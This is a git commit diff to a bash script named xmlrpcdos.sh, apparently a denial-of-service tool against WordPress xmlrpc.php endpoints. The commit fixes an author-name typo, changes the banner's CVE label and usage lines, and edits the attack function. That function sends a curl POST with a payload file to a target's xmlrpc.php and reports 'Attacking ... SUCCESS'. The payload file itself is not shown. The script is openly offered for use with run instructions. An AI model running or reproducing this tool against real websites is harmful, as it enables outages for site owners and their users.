b068b1c1a60746c88e614ca6c46ae15056311c50
Nahid <nahidhasanph79@gmail.com>
2026-01-20 10:53:11 +0600

    Fix author name and update usage instructions

--- xmlrpcdos.sh
+++ xmlrpcdos.sh
@@ -1,25 +1,25 @@
 #!/bin/bash
 limit=100
 ###################################################################
-################## Aurhor: Nahid ##################################
+################## Author: Nahid ##################################
 ###################################################################
 ###################################################################
 function banner() {
     local width=56
 
     echo "+--------------------------------------------------------+"
-    printf "|   %-${width}s |\n" "${grey}xmlrpc-ddos${default}"
-    printf "|   %-${width}s |\n" "${yellow}CVE-2018-6389${default}"
+    printf "|   %-${width}s |\n" "${grey}Xmlrpc-Ddos${default}"
+    printf "|   %-${width}s |\n" "${yellow}CVE-2025-54352${default}"
     printf "|   %-${width}s |\n" "${red}Author: Nahid${default}"
     printf "|   %-${width}s |\n" "${red}Link  : https://fumioryoto.github.io${default}"
-    printf "|   %-${width}s |\n" "${red}Usage : chmod +x main.sh${default}"
-    printf "|   %-${width}s |\n" "${red}Usage : ./main.sh <url>${default}"
+    printf "|   %-${width}s |\n" "${red}Usage : chmod +x xmlrpcdos.sh${default}"
+    printf "|   %-${width}s |\n" "${red}Usage : ./xmlrpcdos.sh <url>${default}"
     echo "+--------------------------------------------------------+"
 }
 
 
 function attack() {
-    if [[ $(curl -i -s -k -X POST "${1}/xmlrpc.php" -H "Content-Type: text/html" --data-binary "@payload.txt") =~ "parse error" ]]; then
+    if [[ $(curl -i -s -k -X POST "${1}/xmlrpc.php" -H "Content-Type: text/xml" --data-binary "@payload.txt") =~ "parse error" ]]; then
         echo "${green}[+] Attacking ${default}${1} ${green}SUCCESS${default}"
     else
         echo "${red}[-] Attacking ${default}${1} ${red}FAILED, maybe down or not vuln.${default}"
